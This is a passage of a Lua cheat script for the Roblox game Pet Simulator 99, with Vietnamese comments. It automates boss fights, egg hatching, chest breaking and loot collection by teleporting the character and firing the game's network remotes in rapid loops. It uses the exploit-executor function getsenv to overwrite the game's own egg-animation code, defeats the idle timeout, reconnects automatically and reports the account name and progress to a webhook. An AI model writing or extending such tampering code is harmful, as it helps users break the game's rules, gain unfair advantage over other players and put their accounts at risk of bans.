        if isCooldown then
            return nil, nil, cdString
        end

        -- Nếu trên màn hình có thanh máu giao tranh (The Golden Yeti / The Shiny Yeti / Parent Yeti):
        if isBossActiveGui and STATE.YetiArenaCFrame then
            return "YetiActiveFromGui", STATE.YetiArenaCFrame, nil
        end

        -- 3. Kiểm tra Model Boss trong Workspace (LOẠI BỎ Leaderboard, tượng, pet)
        for _, obj in pairs(workspace:GetChildren()) do
            if obj:IsA("Model") then
                local l = string.lower(obj.Name)
                if (string.find(l, "yeti") or string.find(l, "abominable"))
                   and not string.find(l, "leaderboard")
                   and not string.find(l, "board")
                   and not string.find(l, "statue")
                   and not string.find(l, "sign")
                   and not string.find(l, "egg")
                   and not string.find(l, "pet")
                   and not Players:GetPlayerFromCharacter(obj) then
                    local part = obj.PrimaryPart or obj:FindFirstChildWhichIsA("BasePart", true)
                    if part then return obj, part.CFrame, nil end
                end
            end
        end

        return nil, nil, nil
    end

    -- TẤN CÔNG YETI BẰNG NETWORK (KHÔNG CHẠM VÀO MÀN HÌNH NÉ NÚT SEND PETS)
    local function performAttackYeti(targetObj)
        if not STATE.AutoClickYeti then return end

        if Network and Network.Fire then
            pcall(function()
                local targetUID = nil
                if typeof(targetObj) == "Instance" then
                    targetUID = targetObj.Name
                else
                    local Things = workspace:FindFirstChild("__THINGS")
                    local Breakables = Things and Things:FindFirstChild("Breakables")
                    if Breakables then
                        for _, b in pairs(Breakables:GetChildren()) do
                            local bId = tostring(b:GetAttribute("BreakableID") or "")
                            local areaId = tostring(b:GetAttribute("AreaID") or "")
                            if string.lower(bId) == "yeti" or string.lower(areaId) == "yeti" then
                                targetUID = b.Name
                                break
                            end
                        end
                        if not targetUID and STATE.YetiArenaCFrame then
                            for _, b in pairs(Breakables:GetChildren()) do
                                local part = b:IsA("BasePart") and b or (b:IsA("Model") and (b.PrimaryPart or b:FindFirstChildWhichIsA("BasePart", true)))
                                if part and (part.Position - STATE.YetiArenaCFrame.Position).Magnitude < 90 then
                                    targetUID = b.Name
                                    break
                                end
                            end
                        end
                    end
                end

                if targetUID then
                    Network.Fire("Breakables_PlayerAttackBreakable", targetUID, "1")
                    Network.Fire("Breakables_PlayerAttackBreakable", targetUID, {})
                end
            end)
        end
    end

    -- VÒNG LẶP SĂN YETI
    task.spawn(function()
        while _G.PS99_SUMMIT_RUNNING and _G.PS99_SUMMIT_SESSION == CURRENT_SESSION_ID do
            task.wait(0.4)
            if STATE.AutoYeti then
                local yetiObj, yetiPos, cdTimer = checkYetiBoss()

                if yetiObj and yetiPos then
                    STATE.YetiStatusText = "🔥 Đang Sống!"
                    STATE.CurrentYetiObj = yetiObj
                    if not STATE.IsFightingYeti then
                        STATE.IsFightingYeti = true
                        STATE.CurrentAction = "⚔️ Đang săn Yeti Boss!"
                        if not STATE.YetiArenaCFrame and typeof(yetiPos) == "CFrame" then
                            STATE.YetiArenaCFrame = yetiPos
                        end
                        safeTeleport(yetiPos + Vector3.new(0, 2, 6))
                    end
                else
                    STATE.CurrentYetiObj = nil
                    if cdTimer then
                        STATE.YetiStatusText = "⏳ Đang Chờ (" .. cdTimer .. ")"
                    else
                        STATE.YetiStatusText = "⏳ Chưa hồi sinh"
                    end

                    if STATE.IsFightingYeti then
                        STATE.IsFightingYeti = false
                        STATE.YetiKilledCount = STATE.YetiKilledCount + 1
                        STATE.CurrentAction = "🏆 Yeti đã bị hạ gục!"

                        if STATE.YetiCooldownAlert then
                            sendWebhook(
                                "💥 ĐÃ HẠ GỤC YETI BOSS!",
                                "Tài khoản **" .. Player.Name .. "** đã tiêu diệt Yeti thành công!\n**Tổng số Yeti:** `" .. STATE.YetiKilledCount .. " con`",
                                16766720
                            )
                        end

                        task.wait(1.5)

                        if STATE.AutoHatch then
                            local cavePos = STATE.CaveCFrames[STATE.SelectedCave]
                            if cavePos then
                                safeTeleport(cavePos)
                                STATE.CurrentAction = "🥚 Mở trứng Hang " .. STATE.SelectedCave
                            end
                        elseif STATE.AutoFarmMoney then
                            if STATE.FarmCFrame then
                                safeTeleport(STATE.FarmCFrame)
                                STATE.CurrentAction = "💰 Cày tiền tại Bãi Farm"
                            end
                        end
                    else
                        if STATE.AutoHatch then
                            STATE.CurrentAction = "🥚 Mở trứng Hang " .. STATE.SelectedCave
                        elseif STATE.AutoFarmMoney then
                            STATE.CurrentAction = "💰 Cày tiền tại Bãi Farm"
                        else
                            STATE.CurrentAction = "💤 Đang chờ lệnh..."
                        end
                    end
                end
            else
                STATE.IsFightingYeti = false
                STATE.CurrentYetiObj = nil
            end
        end
    end)

    -- VÒNG LẶP AUTO CLICK YETI TỐC ĐỘ CAO (~12 CLICKS / GIÂY)
    task.spawn(function()
        while _G.PS99_SUMMIT_RUNNING and _G.PS99_SUMMIT_SESSION == CURRENT_SESSION_ID do
            task.wait(0.08)
            if STATE.AutoYeti and STATE.AutoClickYeti and STATE.IsFightingYeti then
                performAttackYeti(STATE.CurrentYetiObj)
            end
        end
    end)

    -- TÌM TÊN TRỨNG CHÍNH XÁC TRONG HANG (SỬ DỤNG DỮ LIỆU CUSTOMEGGS DM_TRAILEGG)
    local function getRealEggName()
        if STATE.SelectedEggName and STATE.SelectedEggName ~= "Nearest" and STATE.SelectedEggName ~= "" then
            return STATE.SelectedEggName
        end

        local Things = workspace:FindFirstChild("__THINGS")
        local CustomEggs = Things and Things:FindFirstChild("CustomEggs")
        local hrp = Player.Character and Player.Character:FindFirstChild("HumanoidRootPart")

        -- 1. ƯU TIÊN 1: Tìm quả trứng thuộc Hang đang chọn (DM_TrailEgg == SelectedCave)
        if CustomEggs then
            for _, egg in pairs(CustomEggs:GetChildren()) do
                local trailNum = egg:GetAttribute("DM_TrailEgg")
                if trailNum and tonumber(trailNum) == tonumber(STATE.SelectedCave) then
                    local eggId = egg:GetAttribute("DM_EggId")
                    if eggId and eggId ~= "" then
                        return eggId, egg
                    end
                end
            end
        end

        -- 2. ƯU TIÊN 2: Quét quả trứng gần nhất trong CustomEggs
        if CustomEggs and hrp then
            local nearest, minDist = nil, 140
            for _, egg in pairs(CustomEggs:GetChildren()) do
                local part = egg:IsA("BasePart") and egg or (egg:IsA("Model") and (egg.PrimaryPart or egg:FindFirstChildWhichIsA("BasePart", true)))
                if part then
                    local dist = (part.Position - hrp.Position).Magnitude
                    if dist < minDist then
                        minDist = dist
                        nearest = egg
                    end
                end
            end
            if nearest then
                local eggId = nearest:GetAttribute("DM_EggId")
                if eggId and eggId ~= "" then return eggId, nearest end
                return nearest.Name, nearest
            end
        end

        -- 3. Quét các model/part có chữ Egg trong bán kính 90 studs
        if hrp then
            for _, obj in pairs(workspace:GetDescendants()) do
                if (obj:IsA("Model") or obj:IsA("BasePart")) and string.find(string.lower(obj.Name), "egg") and not string.find(string.lower(obj.Name), "animation") then
                    local part = obj:IsA("BasePart") and obj or (obj:IsA("Model") and (obj.PrimaryPart or obj:FindFirstChildWhichIsA("BasePart", true)))
                    if part then
                        local dist = (part.Position - hrp.Position).Magnitude
                        if dist < 90 then
                            return obj.Name, obj
                        end
                    end
                end
            end
        end

        return nil, nil
    end

    -- XỬ LÝ POP-UP VÀ BỎ QUA CẮT CẢNH MỞ TRỨNG
    local function handleEggOpeningVisuals()
        pcall(function()
            if STATE.SkipAnimation then
                local ps = Player:FindFirstChild("PlayerScripts")
                local gameScripts = ps and ps:FindFirstChild("Scripts") and ps.Scripts:FindFirstChild("Game")
                if gameScripts then
                    local eggFrontend = gameScripts:FindFirstChild("Egg Opening Frontend")
                    if eggFrontend and getsenv then
                        local env = getsenv(eggFrontend)
                        if env and env.PlayEggAnimation then
                            env.PlayEggAnimation = function() return end
                        end
                    end
                end
            end

            if STATE.ShowHatchPopup then
                local eggOpening = Player.PlayerGui:FindFirstChild("EggOpening")
                if eggOpening then eggOpening.Enabled = true end

                task.wait(1.2)

                -- Tự động bấm nút OK / Continue / Close để đóng pop-up kết quả
                for _, btn in pairs(Player.PlayerGui:GetDescendants()) do
                    if (btn:IsA("TextButton") or btn:IsA("ImageButton")) and btn.Visible then
                        local bName = string.lower(btn.Name)
                        local bText = btn:IsA("TextButton") and string.lower(btn.Text) or ""
                        if bText == "ok" or bText == "continue" or bName == "ok" or bName == "close" or bName == "dismiss" or bName == "next" then
                            pcall(function()
                                if btn.MouseButton1Click then btn.MouseButton1Click:Fire() end
                                if btn.Activated then btn.Activated:Fire() end
                            end)
                        end
                    end
                end
            else
                local eggOpening = Player.PlayerGui:FindFirstChild("EggOpening")
                if eggOpening then
                    eggOpening.Enabled = false
                    for _, el in pairs(eggOpening:GetDescendants()) do
                        if el:IsA("GuiObject") then el.Visible = false end
                    end
                end
                for _, g in pairs(Player.PlayerGui:GetChildren()) do
                    if g:IsA("ScreenGui") and (string.find(string.lower(g.Name), "egg") or string.find(string.lower(g.Name), "hatch")) then
                        g.Enabled = false
                    end
                end
            end
        end)
    end

    -- VÒNG LẶP AUTO HATCH TRỨNG LIÊN TỤC
    task.spawn(function()
        while _G.PS99_SUMMIT_RUNNING and _G.PS99_SUMMIT_SESSION == CURRENT_SESSION_ID do
            task.wait(0.3)
            if STATE.AutoHatch and not STATE.IsFightingYeti then
                local realEgg, eggObj = getRealEggName()

                if realEgg and realEgg ~= "Nearest" and Network and Network.Invoke then
                    -- Tự động lưu vị trí hang nếu chưa có
                    if not STATE.CaveCFrames[STATE.SelectedCave] and eggObj then
                        local part = eggObj:IsA("BasePart") and eggObj or (eggObj:IsA("Model") and (eggObj.PrimaryPart or eggObj:FindFirstChildWhichIsA("BasePart", true)))
                        if part then
                            STATE.CaveCFrames[STATE.SelectedCave] = part.CFrame + Vector3.new(0, 0, 8)
                        end
                    end

                    pcall(function()
                        Network.Invoke("Eggs_RequestPurchase", realEgg, STATE.HatchAmount or 1)
                    end)

                    handleEggOpeningVisuals()
                else
                    task.wait(1)
                end
            end
        end
    end)

    -- VÒNG LẶP PHÁ RƯƠNG TRONG HANG
    task.spawn(function()
        while _G.PS99_SUMMIT_RUNNING and _G.PS99_SUMMIT_SESSION == CURRENT_SESSION_ID do
            task.wait(0.3)
            if STATE.AutoCaveChests and not STATE.IsFightingYeti then
                pcall(function()
                    local c = Player.Character
                    local h = c and c:FindFirstChild("HumanoidRootPart")
                    local Things = workspace:FindFirstChild("__THINGS")
                    local Breakables = Things and Things:FindFirstChild("Breakables")
                    if h and Breakables then
                        local targetChest = nil
                        local targetArea = "Trail" .. tostring(STATE.SelectedCave)
                        local minDist = 180

                        -- 1. Ưu tiên tìm rương thuộc đúng Hang đang chọn (AreaID = TrailX hoặc BreakableID = DiamondMountainTrailChest)
                        for _, b in pairs(Breakables:GetChildren()) do
                            local areaId = tostring(b:GetAttribute("AreaID") or "")
                            local bId = tostring(b:GetAttribute("BreakableID") or "")
                            if (areaId == targetArea or string.lower(areaId) == string.lower(targetArea))
                               or (bId == "DiamondMountainTrailChest" and (areaId == targetArea or areaId == "")) then
                                targetChest = b
                                break
                            end
                        end

                        -- 2. Nếu không tìm theo AreaID thì tìm rương Chest gần nhất
                        if not targetChest then
                            for _, b in pairs(Breakables:GetChildren()) do
                                local bClass = tostring(b:GetAttribute("BreakableClass") or "")
                                local bName = string.lower(b.Name)
                                local bId = string.lower(tostring(b:GetAttribute("BreakableID") or ""))
                                if bClass == "Chest" or string.find(bName, "chest") or string.find(bId, "chest") then
                                    local part = b:IsA("BasePart") and b or (b:IsA("Model") and (b.PrimaryPart or b:FindFirstChildWhichIsA("BasePart", true)))
                                    if part then
                                        local dist = (part.Position - h.Position).Magnitude
                                        if dist < minDist then
                                            minDist = dist
                                            targetChest = b
                                        end
                                    end
                                end
                            end
                        end

                        if targetChest and Network and Network.Fire then
                            Network.Fire("Breakables_PlayerAttackBreakable", targetChest.Name, "1")
                            Network.Fire("Breakables_PlayerAttackBreakable", targetChest.Name, {})
                        end
                    end
                end)
            end
        end
    end)

    -- VÒNG LẶP FARM TIỀN
    task.spawn(function()
        while _G.PS99_SUMMIT_RUNNING and _G.PS99_SUMMIT_SESSION == CURRENT_SESSION_ID do
            task.wait(0.4)
            if STATE.AutoFarmMoney and not STATE.AutoHatch and not STATE.IsFightingYeti then
                pcall(function()
                    local c = Player.Character
                    local h = c and c:FindFirstChild("HumanoidRootPart")
                    local Things = workspace:FindFirstChild("__THINGS")
                    local Breakables = Things and Things:FindFirstChild("Breakables")
                    if h and Breakables and STATE.AutoHitBreakables then
                        local nearest, minDist = nil, 110
                        for _, b in pairs(Breakables:GetChildren()) do
                            local part = b:IsA("BasePart") and b or (b:IsA("Model") and (b.PrimaryPart or b:FindFirstChildWhichIsA("BasePart")))
                            if part then
                                local dist = (part.Position - h.Position).Magnitude
                                if dist < minDist then
                                    minDist = dist
                                    nearest = b
                                end
                            end
                        end
                        if nearest and Network and Network.Fire then
                            Network.Fire("Breakables_PlayerAttackBreakable", nearest.Name, "1")
                            Network.Fire("Breakables_PlayerAttackBreakable", nearest.Name, {})
                        end
                    end
                end)
            end
        end
    end)

    -- HÚT ORBS & LOOTBAGS
    task.spawn(function()
        while _G.PS99_SUMMIT_RUNNING and _G.PS99_SUMMIT_SESSION == CURRENT_SESSION_ID do
            task.wait(0.4)
            if STATE.AutoCollectDrops then
                pcall(function()
                    local c = Player.Character
                    local h = c and c:FindFirstChild("HumanoidRootPart")
                    local Things = workspace:FindFirstChild("__THINGS")
                    if h and Things then
                        local Orbs = Things:FindFirstChild("Orbs")
                        if Orbs then
                            for _, o in pairs(Orbs:GetChildren()) do
                                if o:IsA("BasePart") then o.CFrame = h.CFrame end
                            end
                        end
                        local Lootbags = Things:FindFirstChild("Lootbags")
                        if Lootbags then
                            for _, bag in pairs(Lootbags:GetChildren()) do
                                local p = bag:IsA("BasePart") and bag or (bag:IsA("Model") and (bag.PrimaryPart or bag:FindFirstChildWhichIsA("BasePart")))
                                if p then p.CFrame = h.CFrame end
                            end
                        end
                    end
                end)
            end
        end
    end)

    -- Anti-AFK
    Player.Idled:Connect(function()
        if STATE.AntiAFK and _G.PS99_SUMMIT_RUNNING and VirtualUser then
            pcall(function()
                VirtualUser:CaptureController()
                VirtualUser:ClickButton2(Vector2.new())
            end)
        end
    end)

    -- Auto Reconnect
    pcall(function()
        GuiService.ErrorMessageChanged:Connect(function()
            if STATE.AutoReconnect and _G.PS99_SUMMIT_RUNNING and GuiService:GetErrorCode().Value > 0 then
                sendWebhook("⚠️ MẤT KẾT NỐI", "Đang thử Reconnect vào server sau 10 giây...", 15158332)
                task.wait(10)
                TeleportService:Teleport(game.PlaceId, Player)
            end
        end)
    end)

    -- CẬP NHẬT DASHBOARD
    task.spawn(function()
        while _G.PS99_SUMMIT_RUNNING and _G.PS99_SUMMIT_SESSION == CURRENT_SESSION_ID do
            task.wait(1)
            pcall(function()
                lblAction.Text = STATE.CurrentAction
                lblYetiStatus.Text = STATE.YetiStatusText
                lblYetiCount.Text = STATE.YetiKilledCount .. " con"
                local curD = getDiamonds()
                local diff = curD - STATE.StartingDiamonds
                local elapsed = math.max(1, os.time() - STATE.SessionStart)
                local rate = math.floor((diff / elapsed) * 3600)
                lblDiamonds.Text = formatNumber(curD)
                lblDiffDiamonds.Text = (diff >= 0 and "+" or "") .. formatNumber(diff) .. " (" .. formatNumber(rate) .. "/h)"
                lblUptime.Text = formatDuration(elapsed)
                lblPets.Text = "🟣 " .. STATE.TotalHuge .. " | 🔴 " .. STATE.TotalTitanic
            end)
        end
    end)
end)
